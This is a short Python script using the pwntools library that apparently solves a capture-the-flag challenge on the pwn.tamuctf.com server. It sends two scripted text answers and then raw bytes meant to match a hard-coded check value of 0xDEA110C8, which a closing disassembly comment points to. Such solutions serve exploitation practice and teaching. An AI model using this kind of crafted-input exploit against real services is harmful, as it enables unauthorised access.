from pwn import *

def Read(r):
    print(r.read().decode("utf-8"))

def Send(r, msg):
    r.send(msg)
    print(">>>" + msg)
    Read(r)

r = remote("pwn.tamuctf.com", 4321)
Read(r)
Send(r, "Sir Lancelot of Camelot\n")
Send(r, "To seek the Holy Grail.\n")
Send(r, "\xDE\xA1\x10\xC8\n")


# cmp     [ebp+var_10], 0DEA110C8h????
